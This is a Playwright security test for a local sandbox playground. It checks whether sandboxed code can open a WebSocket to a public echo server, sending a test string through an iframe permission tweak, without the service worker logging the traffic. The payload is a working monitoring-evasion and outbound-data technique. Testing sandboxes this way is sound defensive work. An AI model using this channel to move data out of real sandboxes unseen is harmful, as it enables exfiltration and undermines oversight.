import { test, expect } from '@playwright/test';

test('WebSocket Bypass of Service Worker Logging', async ({ page }) => {
  // 1. Setup
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);

  // Enable scripts
  await page.evaluate(() => {
     window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
  });
  await page.waitForTimeout(2000);
  await page.evaluate(() => window.SandboxControl.clearLogs());

  // 2. Exploit: Connect via WebSocket
  // We use the CSP bypass trick (allow param) to allow the WS domain first,
  // ensuring the connection succeeds. The "Breakout" here is the bypassing of monitoring.

  const payload = `
    (async () => {
      const iframe = document.createElement('iframe');
      // Allow echo.websocket.events (public echo server)
      iframe.src = "/inner-frame.html?allow=echo.websocket.events&unsafe";
      document.body.appendChild(iframe);
      await new Promise(r => iframe.onload = r);

      const child = iframe.contentWindow;
      const script = child.document.createElement('script');
      script.textContent = \`
          console.log("[Exploit] Connecting WS...");
          const ws = new WebSocket('wss://echo.websocket.events');
          ws.onopen = () => {
              console.log("[Exploit] WS Open. Sending data...");
              ws.send('Hidden Payload');
          };
          ws.onmessage = (e) => {
              console.log("[Exploit] WS Echo: " + e.data);
              if (e.data === 'Hidden Payload') {
                  window.top.postMessage({ type: 'PWN_SUCCESS' }, '*');
              }
          };
          ws.onerror = (e) => console.error("[Exploit] WS Error", e);
      \`;
      child.document.body.appendChild(script);
    })();
  `;

  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, payload);

  // 3. Verify: Success message received (Connection worked)
  await page.evaluate(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_SUCCESS') resolve(true);
          });
      });
  });

  // 4. Verify: NO LOGS in the Host for the WebSocket traffic
  // The Service Worker logs HTTP requests (fetch). It cannot see WS.
  const logs = await page.evaluate(() => window.SandboxControl.getLogs());
  const wsLogs = logs.filter(l => l.source === 'network' && l.message.includes('websocket'));

  // We expect ZERO network logs for the websocket
  expect(wsLogs.length).toBe(0);
  console.log("Verified: WebSocket traffic was NOT logged by Service Worker.");
});
